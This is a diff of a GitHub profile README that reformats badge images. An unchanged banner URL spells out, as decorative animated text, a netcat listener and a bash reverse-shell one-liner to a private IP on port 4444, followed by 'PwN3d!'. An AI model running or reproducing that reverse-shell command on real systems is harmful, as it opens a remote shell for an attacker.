@@ -4,8 +4,12 @@
 
 <a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=db24cf&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BXB3AST%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.99.10%2F4444+0%3E%261;XB3AST%40profile%3A~%24+.%2Fexploit.py;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;XB3AST" alt="Typing SVG" /></a>
 
-<p align="left"> <img src="https://komarev.com/ghpvc/?username=xbeast1&label=Profile%20views&color=0e75b6&style=flat" alt="xbeast1" /> </p>
-<img src="https://badges.frapsoft.com/os/v1/open-source.svg?v=102" alt="Open Source Love" style="max-width: 100%;"><i>
+<p align="left">
+  <img src="https://komarev.com/ghpvc/?username=xbeast1&label=Profile%20views&color=0e75b6&style=flat" alt="xbeast1" />
+    &nbsp;
+  <img src="https://badges.frapsoft.com/os/v1/open-source.svg?v=102" alt="Open Source Love"" />
+</p>
+
 
 - 🌱 I’m currently learning **React Js, Node Js, Express Js, Next Js, Mongo Db**
 <br>
